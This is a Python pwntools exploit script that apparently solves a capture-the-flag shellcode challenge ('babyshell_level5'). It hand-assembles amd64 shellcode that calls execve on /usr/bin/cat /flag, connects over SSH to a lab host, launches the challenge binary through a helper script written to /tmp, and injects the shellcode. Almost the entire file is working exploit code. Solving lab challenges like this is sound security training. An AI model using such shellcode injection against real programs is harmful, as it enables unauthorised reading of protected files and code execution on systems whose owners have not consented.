#!/usr/bin/env python3
from pwn import *
import re

context.arch = 'amd64'

# 1 Stackframe is 8 bytes (64bit)

shellcode=f"""
push {u32(b"/cat")} /* Push "tac/" onto the stack (32bit/4byte) */
push {u32(b"/usr")}  /* Push rsu/ onto the stack (32bit/4byte) */
mov dword ptr [rsp+4], {u32(b"/bin")}  /* b'moves nib/ to the remaining 4 bytes of the previous stackframe' */
push rsp /* push stack pointer on the stack */
pop rdi
push {u32(b"/fla")} 
mov dword ptr [rsp+4], {u8(b"g")} 
push rsp
pop rsi
push 0
push rsi
push rdi
push rsp
pop rsi
push 0
pop rdx
push 0x3b
pop rax
syscall
"""
# both not working, how to prevent 48 opcode in 64 bit mode? 
#shellcode=pwnlib.shellcraft.i386.linux.cat("/flag")
#shellcode=pwnlib.shellcraft.amd64.linux.sh()
shellcode=(asm(shellcode))


print('1', disasm(shellcode))
#ELF.from_bytes(shellcode).debug().interactive()


def btos(n):
    return n.decode('UTF-8')
    
s = ssh(host="pwn")
f = SSHPath('/tmp/my_script.py', ssh=s)
f.touch()
f.write_text('import subprocess; subprocess.run("/challenge/babyshell_level5")')
p = s.process(['python', '/tmp/my_script.py'])
r = p.recvuntil(b"Reading 0x1000 bytes from stdin.")
print(r.decode())


shellcode=bytes(shellcode)
p.send(shellcode)
print(p.recvall().decode("UTF-8"))